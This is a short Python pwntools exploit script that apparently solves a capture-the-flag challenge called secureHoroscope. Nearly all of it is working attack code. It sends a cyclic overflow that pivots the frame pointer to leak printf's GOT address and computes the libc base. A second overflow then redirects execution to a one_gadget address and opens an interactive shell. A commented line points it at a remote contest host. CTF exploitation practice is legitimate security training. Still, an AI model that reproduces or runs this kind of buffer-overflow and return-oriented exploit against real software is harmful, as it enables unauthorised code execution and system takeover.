from pwn import *

elf = context.binary = ELF('./secureHoroscope')

# context.terminal = ['gnome-terminal', '--']

io = process()
# io = gdb.debug('./secureHoroscope', 'break *0x0040080e\ncontinue')
# io = remote('sechoroscope.sdc.tf', 1337)
io.recvuntil(b'To get started, tell us how you feel\n')
io.sendline(b'')
io.recvuntil(b"we will have your very own horoscope\n\n")
# Pivot RBP to point towards GOT entry for printf
# Return to code in main() that does printf on buf
# This will leak the address of printf (and thus we can get libc base)
io.sendline(cyclic(112) + p64(0x601020+0x30) + p64(0x40071c))
printf_leak = io.recvuntil(b'That\'s interesting')
printf_leak = printf_leak.split(b'?')[0].split(b' ')[-1] + b'\x00\x00'
printf_addr = unpack(printf_leak, 64)
libc_base_addr = printf_addr - elf.libc.sym['printf']
system_addr = libc_base_addr + elf.libc.sym['system']
io.recvuntil(b"we will have your very own horoscope\n\n")
POP_RDI_GADGET = 0x400873
# binsh_addr = libc_base_addr + next(elf.libc.search(b'/bin/sh'))
ONE_GADGET_LIBC_GADGET = 0x10a2fc
io.sendline(cyclic(120) + p64(libc_base_addr + ONE_GADGET_LIBC_GADGET))
io.interactive()
